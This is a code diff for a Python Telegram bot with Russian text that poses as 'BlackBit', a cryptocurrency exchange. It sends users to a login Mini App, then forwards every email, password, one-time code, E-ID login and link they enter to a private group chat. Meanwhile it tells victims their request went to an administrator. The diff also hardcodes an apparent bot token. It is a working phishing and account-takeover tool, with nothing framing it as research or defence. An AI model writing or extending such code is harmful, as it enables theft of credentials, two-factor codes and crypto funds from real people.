@@ -7,12 +7,15 @@ from datetime import datetime
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
+# ==================== КОНФИГ ====================
 BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I")
-GROUP_CHAT_ID = -1004301542136
-WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
+GROUP_CHAT_ID = -1004301542136  # ← ID ГРУППЫ
+WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"  # ← ССЫЛКА НА MINI APP
+# ===============================================
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
+
 user_sessions = {}
 
 class BlackBitBot:
@@ -21,9 +24,12 @@ class BlackBitBot:
         self.app.add_handler(CommandHandler("start", self.start))
         self.app.add_handler(MessageHandler(filters.ALL, self.handle))
 
+    # ===== 1. /start =====
     async def start(self, update: Update, context):
         user = update.effective_user
         current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
+
+        # Уведомление в группу
         await self.app.bot.send_message(
             chat_id=GROUP_CHAT_ID,
             text=f"🟢 [BLACKBIT] НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n"
@@ -33,44 +39,75 @@ class BlackBitBot:
                  f"🕐 Время: {current_time}",
             parse_mode="Markdown"
         )
-        keyboard = [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))], [KeyboardButton("ℹ️ BLACKBIT")]]
+
+        # Кнопка для входа
+        keyboard = [
+            [KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))],
+            [KeyboardButton("ℹ️ BLACKBIT")]
+        ]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
         await update.message.reply_text(
             f"👋 Привет, {user.first_name}!\n\n"
-            f"Добро пожаловать на BlackBit.\n\n"
+            f"Добро пожаловать на **BlackBit** — криптовалютную биржу нового поколения.\n\n"
             f"🔒 Безопасность, высокая скорость и низкие комиссии.\n"
-            f"📈 Торгуй BTC, ETH, USDT и другими.\n\n"
-            f"Нажми кнопку ВНИЗУ, чтобы войти.",
+            f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.\n\n"
+            f"Нажми кнопку ВНИЗУ, чтобы войти в свой аккаунт.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
 
+    # ===== 2. ОБРАБОТКА СООБЩЕНИЙ =====
     async def handle(self, update: Update, context):
         if not update.message:
             return
+
         msg = update.message
         chat_id = msg.chat.id
         user_id = msg.from_user.id
         text = msg.text
+
         if chat_id == GROUP_CHAT_ID:
             return
+
+        # Кнопка BLACKBIT
         if text == "ℹ️ BLACKBIT":
             await msg.reply_text(
-                f"📘 О проекте BlackBit\n\nBlackBit — криптовалютная биржа.\n\n🔒 Безопасность\n⚡ Скорость\n💰 Низкие комиссии\n\n📈 Торгуй BTC, ETH, USDT.",
+                f"📘 **О проекте BlackBit**\n\n"
+                f"BlackBit — это современная криптовалютная биржа для торговли цифровыми активами.\n\n"
+                f"🔒 **Безопасность** — передовые технологии защиты.\n"
+                f"⚡ **Скорость** — мгновенные транзакции.\n"
+                f"💰 **Низкие комиссии** — выгодные условия для трейдеров.\n\n"
+                f"📈 Торгуй BTC, ETH, USDT и другими криптовалютами.",
+                parse_mode="Markdown",
                 disable_web_page_preview=True
             )
             return
+
+        # Код
         if user_sessions.get(user_id, {}).get('awaiting_code'):
-            await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📧 [BLACKBIT] Код от {user_id}: {text}")
+            await self.app.bot.send_message(
+                chat_id=GROUP_CHAT_ID,
+                text=f"📧 [BLACKBIT] Код от {user_id}: `{text}`",
+                parse_mode="Markdown"
+            )
             user_sessions[user_id]['awaiting_code'] = False
             await msg.reply_text("✅ Отправлено")
             return
+
+        # Ссылка
         if user_sessions.get(user_id, {}).get('awaiting_link'):
-            await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {text}")
+            await self.app.bot.send_message(
+                chat_id=GROUP_CHAT_ID,
+                text=f"🔗 [BLACKBIT] Ссылка от {user_id}: `{text}`",
+                parse_mode="Markdown"
+            )
             user_sessions[user_id]['awaiting_link'] = False
             await msg.reply_text("✅ Отправлено")
             return
-        if text and text.startswith('{') and text.endswith('}'):
+
+        # JSON от Mini App
+        if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
                 step = data.get('step')
@@ -79,51 +116,78 @@ class BlackBitBot:
                 code = data.get('code')
                 eid_type = data.get('type')
                 link = data.get('link')
+
+                # Обычный вход
                 if step == 'login' and email and password:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🔔 [BLACKBIT] НОВАЯ ЗАЯВКА!\n\n"
-                             f"👤 ID: {user_id}\n"
-                             f"📧 Логин: {email}\n"
-                             f"🔑 Пароль: {password}"
+                             f"👤 ID: `{user_id}`\n"
+                             f"📧 Логин: `{email}`\n"
+                             f"🔑 Пароль: `{password}`",
+                        parse_mode="Markdown"
                     )
-                    await msg.reply_text("✅ Заявка отправлена!")
+                    await msg.reply_text("✅ Заявка отправлена администратору!")
                     return
+
+                # Код
                 if step == 'code' and code:
-                    await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"📧 [BLACKBIT] Код от {user_id}: {code}")
+                    await self.app.bot.send_message(
+                        chat_id=GROUP_CHAT_ID,
+                        text=f"📧 [BLACKBIT] Код от {user_id}: `{code}`",
+                        parse_mode="Markdown"
+                    )
                     await msg.reply_text("✅ Отправлено")
                     return
+
+                # E-ID
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🆔 [BLACKBIT] E-ID ВХОД\n\n"
-                             f"👤 ID: {user_id}\n"
-                             f"📧 Логин: {email}\n"
-                             f"🔑 Пароль: {password}"
+                             f"👤 ID: `{user_id}`\n"
+                             f"📧 Логин: `{email}`\n"
+                             f"🔑 Пароль: `{password}`",
+                        parse_mode="Markdown"
                     )
-                    await msg.reply_text("✅ Заявка E-ID отправлена!")
+                    await msg.reply_text("✅ Заявка E-ID отправлена администратору!")
                     return
+
+                # Ссылка
                 if step == 'eid_link' and link:
-                    await self.app.bot.send_message(chat_id=GROUP_CHAT_ID, text=f"🔗 [BLACKBIT] Ссылка от {user_id}: {link}")
-                    await msg.reply_text("✅ Ссылка отправлена!")
+                    await self.app.bot.send_message(
+                        chat_id=GROUP_CHAT_ID,
+                        text=f"🔗 [BLACKBIT] Ссылка от {user_id}: `{link}`",
+                        parse_mode="Markdown"
+                    )
+                    await msg.reply_text("✅ Ссылка отправлена администратору!")
                     return
+
             except Exception as e:
                 logger.error(f"Ошибка: {e}")
                 await msg.reply_text(f"Ошибка: {e}")
-        else:
-            if text:
-                await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
+        else:
+            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
+
+    # ===== 3. ЗАПУСК =====
     def run(self):
-        # Удаляем вебхук перед запуском polling
         try:
             requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
-            print("✅ Вебхук удалён")
+            print("✅ Вебхук сброшен")
         except Exception as e:
-            print(f"⚠️ Ошибка удаления вебхука: {e}")
+            print(f"⚠️ Ошибка сброса вебхука: {e}")
+
+        try:
+            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
+            print("✅ Старые сессии завершены")
+        except Exception as e:
+            print(f"⚠️ Ошибка завершения сессий: {e}")
+
+        time.sleep(1)
 
         print("=" * 50)
-        print("🚀 БОТ BLACKBIT ЗАПУЩЕН (POLLING)")
+        print("🚀 БОТ BLACKBIT ЗАПУЩЕН")
         print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
 
